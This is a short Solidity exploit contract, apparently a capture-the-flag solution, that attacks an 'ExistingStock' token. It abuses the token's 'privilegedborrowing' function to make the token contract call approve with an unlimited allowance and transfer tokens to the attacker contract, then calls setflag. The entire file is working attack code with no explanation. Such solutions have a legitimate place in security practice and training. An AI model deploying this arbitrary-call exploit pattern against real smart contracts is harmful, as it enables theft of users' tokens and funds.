pragma solidity ^0.7.0;

import "./ExistingStock.sol";

contract Exp {

	ExistingStock public token;

	constructor(address _simpleCall) {
		token = ExistingStock(_simpleCall);
	}

	function approve() public {
		bytes memory data = abi.encodeWithSignature(
			"approve(address,uint256)", 
			address(this), uint256(-1)
		);
		token.privilegedborrowing(0, address(0), address(token), data);
	}


	function transfer() public {
		bytes memory data = abi.encodeWithSignature(
			"transfer(address,uint256)", 
			address(this), 300000
		);
		token.privilegedborrowing(1000, address(0), address(token), data);
	}

	function getFlag() public {
		token.setflag();
	}
}